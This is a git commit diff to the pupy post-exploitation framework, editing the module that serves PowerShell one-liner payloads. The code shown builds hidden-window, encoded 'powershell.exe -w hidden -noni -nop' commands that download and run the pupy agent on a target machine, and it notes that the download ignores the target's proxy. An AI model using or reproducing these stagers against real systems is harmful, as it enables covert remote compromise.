891674d335914d439d3bace95783c80679eb4f82
Dc3 <admin@dc3.es>
2017-03-19 19:27:43 +0800

    Change wrong print at oneliner

--- pupy/pupylib/payloads/ps1_oneliner.py
+++ pupy/pupylib/payloads/ps1_oneliner.py
@@ -164,10 +164,7 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Tr
                 b=b64encode(a.encode('UTF-16LE'))
             oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
             message= colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
-        if ssl:
-            print colorize("powershell.exe -w hidden -noni -nop -enc %s"%a, "green")
-        else:
-            print colorize("powershell.exe -w hidden -noni -nop -c \"%s\""%a, "green")
+        print colorize("powershell.exe -w hidden -noni -nop -c \"%s\""%a, "green")
         print " --- "
         print oneliner
         print " --- "
